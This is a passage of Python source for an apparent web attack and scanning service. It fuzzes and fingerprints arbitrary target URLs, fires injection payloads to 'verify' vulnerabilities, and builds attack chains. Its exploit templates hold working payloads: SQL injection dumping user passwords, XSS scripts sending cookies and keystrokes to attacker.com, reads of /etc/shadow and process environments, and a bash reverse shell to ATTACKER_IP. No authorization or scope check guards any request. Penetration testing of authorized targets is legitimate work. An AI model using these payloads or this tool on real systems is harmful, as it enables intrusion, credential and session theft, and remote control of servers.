                    "anomaly_score": round(anomaly_score, 2),
                    "anomalies": anomalies,
                    "recommendation": recommendation,
                })

            except Exception as e:
                results.append({
                    "mutation": fp["mutation"],
                    "parameter": target_param,
                    "payload": fuzz_value,
                    "is_anomaly": False,
                    "anomaly_score": 0,
                    "error": str(e)[:200],
                })
    finally:
        _dashboard_stats["fuzz_sessions_active"] = max(0, _dashboard_stats["fuzz_sessions_active"] - 1)

    return {
        "success": True,
        "session_id": session_id,
        "total_mutations": len(results),
        "anomalies_found": anomalies_found,
        "baseline": {
            "status": baseline_status,
            "length": baseline_length,
            "time_ms": baseline_time,
        },
        "results": results,
    }

@router.post("/intel")
async def gather_intel(payload: IntelPayload):
    """Gather intelligence about a target using real HTTP requests."""
    if not payload.url.strip():
        raise HTTPException(400, "URL is required")

    result = await _execute_http_request(
        method="GET", url=payload.url,
        headers={"User-Agent": "Mozilla/5.0 (compatible; QuantaraScanner/1.0)"},
        cookies={}, params={}, body=None, timeout=15,
    )
    _track_request(payload.url)

    intel = {
        "url": payload.url,
        "status_code": result.get("response", {}).get("status_code", 0),
        "technologies": [],
        "server": "",
        "framework": "",
        "security_headers": {},
        "waf_detected": False,
        "waf_type": "",
        "cdn_detected": False,
        "cdn_type": "",
        "api_endpoints": [],
    }

    if not result.get("success"):
        return {"success": True, "intel": intel, "error": result.get("error")}

    resp_headers = result.get("response", {}).get("headers", {})
    resp_body = result.get("response", {}).get("body", "")

    # Server detection
    server = resp_headers.get("server", resp_headers.get("Server", ""))
    intel["server"] = server

    # Technology fingerprinting
    tech_patterns = {
        "PHP": [r"(?i)x-powered-by.*php", r"\.php"],
        "ASP.NET": [r"(?i)x-powered-by.*asp\.net", r"(?i)x-aspnet"],
        "Express.js": [r"(?i)x-powered-by.*express"],
        "Django": [r"(?i)csrfmiddlewaretoken", r"(?i)django"],
        "Flask": [r"(?i)werkzeug", r"(?i)flask"],
        "Ruby on Rails": [r"(?i)x-powered-by.*phusion", r"(?i)rails"],
        "Spring": [r"(?i)x-application-context", r"(?i)spring"],
        "React": [r"(?i)__NEXT_DATA__|_next/static|react"],
        "Angular": [r"(?i)ng-version|ng-app"],
        "Vue.js": [r"(?i)__vue__|vue\.js"],
        "WordPress": [r"(?i)wp-content|wordpress"],
        "Nginx": [r"(?i)^nginx"],
        "Apache": [r"(?i)^apache"],
        "CloudFlare": [r"(?i)cloudflare|cf-ray"],
        "AWS": [r"(?i)x-amz|amazon|aws"],
    }

    header_text = json.dumps(resp_headers).lower()
    body_lower = resp_body[:10000].lower()
    scan_text = header_text + "\n" + body_lower

    for tech, patterns in tech_patterns.items():
        for pat in patterns:
            if re.search(pat, scan_text):
                intel["technologies"].append(tech)
                break

    # WAF detection
    waf_signatures = {
        "Cloudflare": ["cf-ray", "cloudflare"],
        "Akamai": ["akamai", "x-akamai"],
        "AWS WAF": ["awselb", "x-amzn-requestid"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Imperva": ["x-iinfo", "imperva"],
    }
    for waf_name, sigs in waf_signatures.items():
        for sig in sigs:
            if sig in header_text:
                intel["waf_detected"] = True
                intel["waf_type"] = waf_name
                break

    # CDN detection
    cdn_signatures = {
        "Cloudflare": ["cf-ray", "cf-cache-status"],
        "Fastly": ["x-fastly", "fastly"],
        "AWS CloudFront": ["x-amz-cf", "cloudfront"],
        "Akamai": ["x-akamai"],
    }
    for cdn_name, sigs in cdn_signatures.items():
        for sig in sigs:
            if sig in header_text:
                intel["cdn_detected"] = True
                intel["cdn_type"] = cdn_name
                break

    # Security headers
    intel["security_headers"] = _check_security_headers(resp_headers)

    # Detect framework from headers
    powered_by = resp_headers.get("x-powered-by", resp_headers.get("X-Powered-By", ""))
    if powered_by:
        intel["framework"] = powered_by

    return {"success": True, "intel": intel}


# ═══════════════════════════════════════════════════════════════════════════════
# Verify Module — Automated vulnerability confirmation
# ═══════════════════════════════════════════════════════════════════════════════

@router.post("/verify")
async def verify_vulnerability(payload: VerifyPayload):
    """Attempt automated verification of a potential vulnerability."""
    if not payload.url.strip():
        raise HTTPException(400, "URL is required")

    verification_results = []
    vuln_type = payload.vuln_type.lower() if payload.vuln_type else "generic"

    # Get verification payloads
    verify_payloads = _ATTACK_VECTOR_DB.get(vuln_type, _ATTACK_VECTOR_DB.get("sqli", {})).get("payloads", [])[:5]

    # Send baseline
    baseline = await _execute_http_request(
        method=payload.method, url=payload.url,
        headers=payload.headers, cookies=payload.cookies,
        params=payload.params, body=payload.body, timeout=10,
    )
    baseline_status = baseline.get("response", {}).get("status_code", 0)
    baseline_body = baseline.get("response", {}).get("body", "")
    baseline_length = len(baseline_body)

    for vp in verify_payloads:
        mut_params = dict(payload.params)
        if payload.parameter:
            mut_params[payload.parameter] = vp

        resp = await _execute_http_request(
            method=payload.method, url=payload.url,
            headers=payload.headers, cookies=payload.cookies,
            params=mut_params, body=payload.body, timeout=10,
        )

        resp_status = resp.get("response", {}).get("status_code", 0)
        resp_body = resp.get("response", {}).get("body", "")
        vulns = resp.get("security", {}).get("vulnerabilities", [])

        confirmed = len(vulns) > 0 or resp_status != baseline_status
        verification_results.append({
            "payload": vp,
            "status_code": resp_status,
            "response_length": len(resp_body),
            "confirmed": confirmed,
            "vulns_detected": vulns,
            "baseline_diff": resp_status != baseline_status,
        })

    confirmed_count = sum(1 for r in verification_results if r["confirmed"])
    if confirmed_count > 0:
        _track_request(payload.url, confirmed=confirmed_count)

    return {
        "success": True,
        "vuln_type": vuln_type,
        "total_tests": len(verification_results),
        "confirmed": confirmed_count,
        "results": verification_results,
        "verdict": "CONFIRMED" if confirmed_count > 0 else "NOT_CONFIRMED",
    }


# ═══════════════════════════════════════════════════════════════════════════════
# Dashboard & Tracking Counters
# ═══════════════════════════════════════════════════════════════════════════════

_dashboard_stats: Dict[str, int] = {
    "requests_sent": 0,
    "payloads_tested": 0,
    "potential_vulnerabilities": 0,
    "confirmed_vulnerabilities": 0,
    "fuzz_sessions_active": 0,
}

_target_memory: Dict[str, dict] = {}  # hostname -> target memory


def _track_request(url: str, vulns: int = 0, confirmed: int = 0, payloads: int = 0, db_type: Optional[str] = None, framework: Optional[str] = None):
    """Update dashboard counters."""
    _dashboard_stats["requests_sent"] += 1
    _dashboard_stats["payloads_tested"] += payloads
    _dashboard_stats["potential_vulnerabilities"] += vulns
    _dashboard_stats["confirmed_vulnerabilities"] += confirmed

    # Update target memory
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        if host and host not in ("", "localhost", "127.0.0.1"):
            if host not in _target_memory:
                _target_memory[host] = {
                    "hostname": host,
                    "last_seen": datetime.now(timezone.utc).isoformat(),
                    "db_type": "",
                    "framework": "",
                    "technologies": [],
                    "endpoints_discovered": 0,
                    "confirmed_vulns": 0,
                }
            tm = _target_memory[host]
            tm["last_seen"] = datetime.now(timezone.utc).isoformat()
            tm["endpoints_discovered"] += 1
            tm["confirmed_vulns"] += confirmed
            if db_type:
                tm["db_type"] = db_type
            if framework:
                tm["framework"] = framework
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
# AI Verify — Verification Steps & Exploit Options
# ═══════════════════════════════════════════════════════════════════════════════

class AIVerifyPayload(BaseModel):
    vuln_type: str = ""
    target_value: str = ""


@router.post("/ai/verify")
async def ai_verify(payload: AIVerifyPayload):
    """Generate verification steps and exploit options for a vulnerability."""
    vuln_type = payload.vuln_type.lower() if payload.vuln_type else "generic"

    # Map common names
    type_map = {
        "sqli": "sqli", "sql_injection": "sqli", "sql injection": "sqli",
        "xss": "xss", "cross-site scripting": "xss", "cross_site_scripting": "xss",
        "lfi": "lfi", "path traversal": "lfi", "path_traversal": "lfi",
        "ssrf": "ssrf", "server-side request forgery": "ssrf",
        "rce": "cmdi", "command injection": "cmdi", "cmdi": "cmdi",
        "ssti": "ssti", "template injection": "ssti",
        "idor": "idor",
    }
    db_key = type_map.get(vuln_type, "sqli")
    attack_data = _ATTACK_VECTOR_DB.get(db_key, _ATTACK_VECTOR_DB.get("sqli", {}))
    payloads_list = attack_data.get("payloads", [])

    # Build verification steps
    verification_steps = []
    step_descriptions = {
        "sqli": [
            "Test basic SQL injection with single quote",
            "Test boolean-based blind injection",
            "Test UNION-based injection to enumerate columns",
            "Test time-based blind injection",
            "Test error-based injection for version disclosure",
        ],
        "xss": [
            "Test basic script tag injection",
            "Test event handler injection (img onerror)",
            "Test DOM-based XSS with encoded payload",
            "Test SVG-based XSS",
            "Test attribute-based injection",
        ],
        "lfi": [
            "Test basic path traversal to /etc/passwd",
            "Test double-encoded path traversal",
            "Test Windows path traversal",
            "Test PHP wrapper for source code disclosure",
            "Test null byte injection",
        ],
        "cmdi": [
            "Test semicolon command separator",
            "Test pipe command chaining",
            "Test backtick command substitution",
            "Test dollar-paren command substitution",
            "Test AND operator chaining",
        ],
    }

    descriptions = step_descriptions.get(db_key, [
        "Test with basic payload",
        "Test with encoded variant",
        "Test with alternative syntax",
        "Test with evasion technique",
        "Test with maximum impact payload",
    ])

    expected_results = {
        "sqli": [
            "SQL error message or unexpected response change",
            "Different response for TRUE vs FALSE condition",
            "Additional data columns visible in response",
            "Response delayed by ~5 seconds",
            "Database version string in error message",
        ],
        "xss": [
            "Script tag reflected in response body unescaped",
            "Event handler executed — alert box or DOM change",
            "Encoded payload decoded and executed in DOM",
            "SVG payload triggers JavaScript execution",
            "Attribute context breakout with injected handler",
        ],
        "lfi": [
            "Contents of /etc/passwd visible in response",
            "File contents visible despite WAF filtering",
            "Windows system file contents in response",
            "PHP source code in base64-encoded response",
            "File inclusion with null byte bypass",
        ],
        "cmdi": [
            "Additional command output appended to response",
            "System file contents or command output visible",
            "Command output injected via backtick execution",
            "Shell expansion output in response",
            "Chained command output visible",
        ],
    }

    expected = expected_results.get(db_key, [
        "Unexpected response change",
        "Modified behavior compared to baseline",
        "New data or error messages appearing",
        "WAF bypass successful",
        "Full exploitation possible",
    ])

    for i, p in enumerate(payloads_list[:5]):
        verification_steps.append({
            "step": i + 1,
            "payload": p,
            "description": descriptions[i] if i < len(descriptions) else f"Test payload variant #{i+1}",
            "expected_result": expected[i] if i < len(expected) else "Anomalous response indicating vulnerability",
        })

    # Build exploit options
    exploit_options = []
    exploit_templates = {
        "sqli": [
            {"id": "sqli-extract-version", "label": "Extract DB Version", "payload": "' AND 1=CONVERT(int,@@version)--"},
            {"id": "sqli-dump-tables", "label": "Enumerate Tables", "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--"},
            {"id": "sqli-dump-users", "label": "Dump Users Table", "payload": "' UNION SELECT username,password FROM users--"},
            {"id": "sqli-time-blind", "label": "Time-Based Blind", "payload": "' AND IF(1=1,SLEEP(5),0)--"},
        ],
        "xss": [
            {"id": "xss-cookie-steal", "label": "Cookie Exfiltration", "payload": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"},
            {"id": "xss-keylogger", "label": "Keylogger Injection", "payload": "<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key;}</script>"},
            {"id": "xss-dom-redirect", "label": "DOM Redirect", "payload": "<script>window.location='http://attacker.com/phish'</script>"},
        ],
        "lfi": [
            {"id": "lfi-etc-shadow", "label": "Read /etc/shadow", "payload": "../../../../etc/shadow"},
            {"id": "lfi-proc-self", "label": "Read Process Info", "payload": "/proc/self/environ"},
            {"id": "lfi-php-filter", "label": "PHP Source Disclosure", "payload": "php://filter/convert.base64-encode/resource=config.php"},
        ],
        "cmdi": [
            {"id": "cmdi-reverse-shell", "label": "Reverse Shell", "payload": "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"},
            {"id": "cmdi-file-read", "label": "Read Sensitive File", "payload": "; cat /etc/passwd"},
            {"id": "cmdi-whoami", "label": "Identify User", "payload": "; whoami"},
        ],
    }
    exploit_options = exploit_templates.get(db_key, [
        {"id": "generic-1", "label": "Basic Exploit", "payload": payloads_list[0] if payloads_list else "test"},
        {"id": "generic-2", "label": "Advanced Exploit", "payload": payloads_list[-1] if payloads_list else "test"},
    ])

    return {
        "success": True,
        "verification_steps": verification_steps,
        "exploit_options": exploit_options,
    }


# ═══════════════════════════════════════════════════════════════════════════════
# AI Response Intelligence
# ═══════════════════════════════════════════════════════════════════════════════

class ResponseIntelPayload(BaseModel):
    status_code: int = 200
    headers: Dict[str, str] = {}
    body: str = ""
    request_body: str = ""
    target_url: str = ""


@router.post("/ai/response-intel")
async def ai_response_intel(payload: ResponseIntelPayload):
    """Analyse a response for intelligence: patterns, DB type, framework, leaks."""
    patterns: List[dict] = []
    body = payload.body or ""
    headers = payload.headers or {}
    lower_body = body.lower()

    # ── Database fingerprinting ──
    db_type = None
    db_patterns = {
        "MySQL": [r"(?i)(mysql|mariadb|MySQLSyntaxErrorException)", r"(?i)you have an error in your sql syntax"],
        "PostgreSQL": [r"(?i)(postgresql|pg_query|PSQLException)", r"(?i)ERROR:\s+syntax error at or near"],
        "SQLite": [r"(?i)(sqlite3?|SQLite3::)", r"(?i)SQLITE_ERROR"],
        "MSSQL": [r"(?i)(microsoft sql server|mssql|Unclosed quotation mark)", r"(?i)Incorrect syntax near"],
        "Oracle": [r"(?i)(ORA-\d{5}|oracle)", r"(?i)PLS-\d{5}"],
        "MongoDB": [r"(?i)(mongo|MongoError|BSON)", r"(?i)not authorized on"],
    }
    for db_name, db_pats in db_patterns.items():
        for pat in db_pats:
            if re.search(pat, body[:30000]):
                db_type = db_name
                patterns.append({
                    "type": f"{db_name} Database Detected",
                    "detail": f"Response contains {db_name} error signature — database type fingerprinted",
                    "severity": "high",
                    "evidence": re.search(pat, body[:30000]).group(0)[:100] if re.search(pat, body[:30000]) else "",
                })
                break
        if db_type:
            break

    # ── Framework detection ──
    framework = None
    fw_checks = {
        "x-powered-by": ("X-Powered-By", "medium"),
        "server": ("Server", "low"),
        "x-aspnet-version": ("ASP.NET", "medium"),
        "x-generator": ("Generator", "low"),
    }
    lower_hdrs = {k.lower(): v for k, v in headers.items()}
    for hdr_key, (fw_label, sev) in fw_checks.items():
        if hdr_key in lower_hdrs:
            framework = lower_hdrs[hdr_key]
            patterns.append({
                "type": f"Framework Disclosure ({fw_label})",
                "detail": f"Header '{hdr_key}' reveals technology: {lower_hdrs[hdr_key]}",
                "severity": sev,
                "evidence": f"{hdr_key}: {lower_hdrs[hdr_key]}",
            })
            break

    # ── Stack trace detection ──
    stack_trace_detected = False
    stack_patterns = [
        r"(?i)(Traceback \(most recent call last\))",
        r"(?i)(at \w+\.\w+\.\w+\([\w.]+:\d+\))",
        r"(?i)(Exception in thread)",
        r"(?i)(Fatal error:.*in .* on line \d+)",
        r"(?i)(Stack trace:)",
    ]
    for sp in stack_patterns:
        m = re.search(sp, body[:20000])
        if m:
            stack_trace_detected = True
            patterns.append({
                "type": "Stack Trace Detected",
                "detail": "Application stack trace leaked in response — reveals internal code structure",
                "severity": "high",
                "evidence": m.group(0)[:120],
            })
            break

    # ── Internal IP detection ──
    internal_ips = []
    ip_pattern = r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b"
    found_ips = re.findall(ip_pattern, body[:30000])
    if found_ips:
        internal_ips = list(set(found_ips))[:10]
        patterns.append({
            "type": "Internal IP Addresses Leaked",
            "detail": f"Found {len(internal_ips)} internal IP address(es) in response body",
            "severity": "medium",
            "evidence": ", ".join(internal_ips[:3]),
        })

    # ── Token / secret detection ──
    tokens_exposed = []
    token_patterns = {
        "JWT": r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+",
        "API Key": r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})",
        "AWS Key": r"(?:AKIA|ASIA)[A-Z0-9]{16}",
        "Bearer Token": r"(?i)bearer\s+([A-Za-z0-9._~+/=-]{20,})",
    }
    for token_type, tp in token_patterns.items():
        found = re.findall(tp, body[:30000])
        if found:
            for f in found[:3]:
                raw = f if isinstance(f, str) else str(f)
                tokens_exposed.append(raw[:60])
            patterns.append({
                "type": f"{token_type} Token Exposed",
                "detail": f"{token_type} token found in response body",
                "severity": "critical",
                "evidence": (found[0] if isinstance(found[0], str) else str(found[0]))[:40] + "...",
            })

    # ── Reflected parameter detection ──
    reflected_parameters = []
    if payload.request_body:
        # Check if request body values are reflected in response
        try:
            req_data = json.loads(payload.request_body)
            if isinstance(req_data, dict):
                for key, val in req_data.items():
                    if isinstance(val, str) and len(val) > 3 and val in body:
                        reflected_parameters.append(key)
        except (json.JSONDecodeError, TypeError):
            pass
    # Also check URL params
    try:
        parsed_url = urlparse(payload.target_url)
        url_params = parse_qs(parsed_url.query)
        for pname, pvals in url_params.items():
            for pv in pvals:
                if pv and len(pv) > 3 and pv in body:
                    reflected_parameters.append(pname)
    except Exception:
        pass

    if reflected_parameters:
        patterns.append({
            "type": "Reflected Parameters",
            "detail": f"Parameters reflected in response: {', '.join(reflected_parameters[:5])} — potential XSS",
            "severity": "high",
            "evidence": ", ".join(reflected_parameters[:3]),
        })

    # ── Missing security headers ──
    missing_security_headers = []
    for sh in _SECURITY_HEADERS:
        if sh not in lower_hdrs:
            missing_security_headers.append(sh)

    # ── Information disclosure patterns ──
    info_patterns = [
        (r"(?i)debug\s*=\s*true", "Debug Mode Enabled", "Application running in debug mode", "high"),
        (r"(?i)phpinfo\(\)", "PHPInfo Exposed", "PHPInfo page accessible", "critical"),
        (r"(?i)directory\s+listing", "Directory Listing", "Directory listing enabled on server", "medium"),
        (r"(?i)version[\"']?\s*[:=]\s*[\"']?\d+\.\d+", "Version Disclosure", "Software version number leaked", "low"),
    ]
    for ip_pat, ip_type, ip_detail, ip_sev in info_patterns:
        m = re.search(ip_pat, body[:20000])
        if m:
            patterns.append({
                "type": ip_type,
                "detail": ip_detail,
                "severity": ip_sev,
                "evidence": m.group(0)[:80],
            })

    # Sort patterns by severity
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    patterns.sort(key=lambda p: sev_order.get(p.get("severity", "low"), 4))

    # Track logic if we found something
    if db_type or framework:
        _track_request(payload.target_url, db_type=db_type, framework=framework)

    return {
        "patterns": patterns,
        "database_type": db_type,
        "framework": framework,
        "internal_ips": internal_ips,
        "tokens_exposed": tokens_exposed,
        "stack_trace_detected": stack_trace_detected,
        "reflected_parameters": list(set(reflected_parameters)),
        "missing_security_headers": missing_security_headers,
    }


# ═══════════════════════════════════════════════════════════════════════════════
# AI Attack Graph
# ═══════════════════════════════════════════════════════════════════════════════

class AttackGraphPayload(BaseModel):
    target: str = ""
    findings: List[dict] = []


@router.post("/ai/attack-graph")
async def ai_attack_graph(payload: AttackGraphPayload):
    """Build an attack surface graph from findings."""
    target = payload.target or "Unknown Target"
    findings = payload.findings or []

    # Group findings by endpoint
    endpoints: Dict[str, List[dict]] = {}
    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}

    for f in findings:
        ep = f.get("endpoint", f.get("url", "/unknown"))
        if ep not in endpoints:
            endpoints[ep] = []
        endpoints[ep].append(f)
        sev = (f.get("severity", "medium") or "medium").lower()
        if sev in severity_counts:
            severity_counts[sev] += 1

    # Build tree
    root_children = []
    for ep, ep_findings in endpoints.items():
        vuln_nodes = []
        for vf in ep_findings:
            sev = (vf.get("severity", "medium") or "medium").lower()
            vuln_nodes.append({
                "id": f"vuln-{uuid.uuid4().hex[:8]}",
                "label": vf.get("type", vf.get("vuln_type", "Unknown Vulnerability")),
                "type": "vulnerability",
                "severity": sev,
                "confidence": vf.get("confidence", 0.5),
                "parameter": vf.get("parameter", ""),
                "children": [],
            })
        root_children.append({
            "id": f"ep-{hashlib.md5(ep.encode()).hexdigest()[:8]}",
            "label": ep,
            "type": "endpoint",
            "vuln_count": len(vuln_nodes),
            "children": vuln_nodes,
        })

    tree = {
        "id": "root",
        "label": target,
        "type": "root",
        "children": root_children,
    }

    # Generate attack chains
    chains = []

    # Chain 1: SQLi → Data Exfiltration
    sqli_findings = [f for f in findings if "sql" in (f.get("type", "") + f.get("vuln_type", "")).lower()]
    if sqli_findings:
        chains.append({
            "name": "SQL Injection → Data Exfiltration",
            "steps": [
                f"Exploit SQL Injection on {sqli_findings[0].get('endpoint', 'endpoint')}",
                "Enumerate database tables via UNION SELECT",
                "Extract sensitive data (users, credentials, PII)",
                "Potential lateral movement via DB access",
            ],
            "impact": "Full database compromise — sensitive data exposure, credential theft",
            "severity": "critical",
        })

    # Chain 2: XSS → Session Hijack
    xss_findings = [f for f in findings if "xss" in (f.get("type", "") + f.get("vuln_type", "")).lower()]
    if xss_findings:
        chains.append({
            "name": "XSS → Session Hijacking",
            "steps": [
                f"Inject XSS payload on {xss_findings[0].get('endpoint', 'endpoint')}",
                "Steal session cookies via document.cookie exfiltration",
                "Impersonate victim user with stolen session",
                "Escalate privileges if admin session captured",
            ],
            "impact": "Account takeover via session hijacking",
            "severity": "high",
        })

    # Chain 3: SSRF → Internal Access
    ssrf_findings = [f for f in findings if "ssrf" in (f.get("type", "") + f.get("vuln_type", "")).lower()]
    if ssrf_findings:
        chains.append({
            "name": "SSRF → Internal Network Access",
            "steps": [
                f"Exploit SSRF on {ssrf_findings[0].get('endpoint', 'endpoint')}",
                "Probe internal services (Redis, databases, admin panels)",
                "Access cloud metadata endpoint (169.254.169.254)",
                "Extract cloud credentials and API keys",
            ],
            "impact": "Internal network compromise — cloud credential theft",
            "severity": "critical",
        })

    # Chain 4: Auth Bypass + IDOR
    auth_findings = [f for f in findings if any(t in (f.get("type", "") + f.get("vuln_type", "")).lower()
                     for t in ["auth", "idor", "privilege"])]
    if auth_findings:
        chains.append({
            "name": "Authentication Bypass → Privilege Escalation",
            "steps": [
                f"Bypass authentication on {auth_findings[0].get('endpoint', 'endpoint')}",
                "Access admin endpoints without proper authorization",
                "Modify user roles/permissions via IDOR",
                "Full application takeover",
            ],
            "impact": "Complete application compromise — unauthorized admin access",
            "severity": "critical",
        })

    # Generic chain if nothing specific found
    if not chains and findings:
        chains.append({
            "name": "Multi-Vector Attack",
            "steps": [
                "Combine identified vulnerabilities for chained exploitation",
                "Use information disclosure to refine attack payloads",
                "Escalate from low-impact to high-impact exploitation",
            ],
            "impact": "Combined attack surface exploitation",
            "severity": "medium",
        })

    total_vulns = sum(severity_counts.values())

    return {
        "tree": tree,
        "chains": chains,
        "summary": {
            "total_endpoints": len(endpoints),
            "total_vulnerabilities": total_vulns,
            **severity_counts,
        },
    }


# ═══════════════════════════════════════════════════════════════════════════════
# AI Dashboard Stats
# ═══════════════════════════════════════════════════════════════════════════════

@router.get("/ai/dashboard")
async def ai_dashboard():
    """Return live dashboard metrics."""
    return {
        "requests_sent": _dashboard_stats["requests_sent"],
        "payloads_tested": _dashboard_stats["payloads_tested"],
        "potential_vulnerabilities": _dashboard_stats["potential_vulnerabilities"],
        "confirmed_vulnerabilities": _dashboard_stats["confirmed_vulnerabilities"],
        "fuzz_sessions_active": _dashboard_stats["fuzz_sessions_active"],
        "targets_in_memory": len(_target_memory),
        "history_count": len(_history_order),
    }


# ═══════════════════════════════════════════════════════════════════════════════
# AI Target Memory
# ═══════════════════════════════════════════════════════════════════════════════

@router.get("/ai/memory")
async def ai_memory():
    """Return AI learning memory — target profiles."""
    results = []
    for target, profile in _target_memory.items():
        results.append({
            "target": target,
            **profile
        })
    return {"targets": results}


# ═══════════════════════════════════════════════════════════════════════════════
# WebSocket Telemetry
# ═══════════════════════════════════════════════════════════════════════════════

_ws_clients: List[WebSocket] = []


@router.websocket("/ws/telemetry")
async def ws_telemetry(websocket: WebSocket):
    """WebSocket endpoint for real-time telemetry streaming."""
    await websocket.accept()
    _ws_clients.append(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # Echo back or handle commands
            await websocket.send_json({"type": "ack", "data": data})
    except WebSocketDisconnect:
        _ws_clients.remove(websocket)
    except Exception:
        if websocket in _ws_clients:
            _ws_clients.remove(websocket)


async def broadcast_telemetry(event: dict):
    """Broadcast telemetry event to all connected WebSocket clients."""
    disconnected = []
    for ws in _ws_clients:
        try:
            await ws.send_json(event)
        except Exception:
            disconnected.append(ws)
    for ws in disconnected:
        _ws_clients.remove(ws)
